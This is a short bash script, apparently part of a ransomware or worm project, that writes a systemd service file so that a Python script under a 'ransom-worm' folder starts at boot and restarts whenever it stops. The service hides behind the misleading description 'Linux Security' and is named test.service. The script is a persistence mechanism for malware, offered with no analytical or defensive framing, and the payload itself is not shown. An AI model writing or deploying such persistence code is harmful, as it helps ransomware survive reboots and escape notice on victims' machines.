#!/bin/bash
user_home="/home/$USER"

echo "[Unit]
Description=Linux Security
After=multi-user.target

[Service]
Type=simple
Restart=always
ExecStart=/usr/bin/python3 $user_home/ransom-worm/main.py

[Install]
WantedBy=multi-user.target" > /etc/systemd/system/test.service